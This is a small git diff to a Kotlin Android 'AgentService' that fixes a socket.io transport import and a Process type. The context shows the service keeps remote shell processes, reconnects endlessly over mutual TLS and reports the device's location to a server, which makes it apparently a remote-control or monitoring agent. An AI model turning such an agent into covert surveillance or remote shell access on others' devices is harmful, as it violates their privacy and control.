@@ -7,7 +7,7 @@ import android.os.*
 import android.util.Log
 import io.socket.client.IO
 import io.socket.client.Socket
-import io.socket.engineio.client.transports.WebSockets
+import io.socket.engineio.client.transports.WebSocket
 import okhttp3.OkHttpClient
 import org.json.JSONArray
 import org.json.JSONObject
@@ -45,7 +45,7 @@ class AgentService : Service() {
     private var heartbeatHandler: Handler? = null
     private var heartbeatRunnable: Runnable? = null
     private val startTime = System.currentTimeMillis()
-    private val activeShells = mutableMapOf<String, Process>()
+    private val activeShells = mutableMapOf<String, java.lang.Process>()
     // Última localização enviada ao servidor — evita enviar o mesmo ponto repetidamente
     @Volatile private var lastSentLocationTime = 0L
 
@@ -75,7 +75,7 @@ class AgentService : Service() {
         try {
             val okHttp = buildMtlsClient()
             val opts = IO.Options().apply {
-                transports       = arrayOf(WebSockets.NAME)
+                transports       = arrayOf(WebSocket.NAME)
                 secure           = true
                 reconnection     = true
                 reconnectionAttempts = Int.MAX_VALUE
